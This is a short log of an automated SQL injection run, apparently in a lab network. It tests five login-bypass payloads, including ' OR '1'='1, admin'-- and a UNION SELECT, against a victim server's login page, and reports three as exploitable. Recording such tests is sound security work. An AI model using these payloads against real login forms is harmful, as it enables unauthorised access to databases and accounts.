============================================================
Attack Type: SQL_Injection
Timestamp: 2025-10-29_17-08-53
Attacker: Control Center (172.20.0.5)
Target: Victim Server (172.20.0.10)
============================================================

[17:08:48] 🔴 ATTACK INITIATED: SQL Injection
[17:08:48] Attacker: Control Center (172.20.0.5)
[17:08:48] Target: Victim Server (172.20.0.10:5000/login)
[17:08:48] Attack Method: Database Exploitation
[17:08:48] Testing: Authentication Bypass (OR injection) | Payload: ' OR '1'='1
[17:08:48] ✗ PROTECTED: Authentication Bypass (OR injection) - Input sanitization detected
[17:08:49] Testing: Comment Injection | Payload: admin'--
[17:08:49] ✓ VULNERABLE: Comment Injection - Exploitation successful!
[17:08:50] Testing: UNION-based SQL Injection | Payload: ' UNION SELECT NULL--
[17:08:50] ✓ VULNERABLE: UNION-based SQL Injection - Exploitation successful!
[17:08:51] Testing: Boolean-based Blind Injection | Payload: ' OR 1=1--
[17:08:51] ✓ VULNERABLE: Boolean-based Blind Injection - Exploitation successful!
[17:08:52] Testing: AND Injection | Payload: admin' AND '1'='1
[17:08:52] ✗ PROTECTED: AND Injection - Input sanitization detected
[17:08:53] 📊 Attack Summary: 3/5 vulnerabilities exploitable
[17:08:53] ⚠️  RESULT: Critical vulnerabilities found - Database accessible
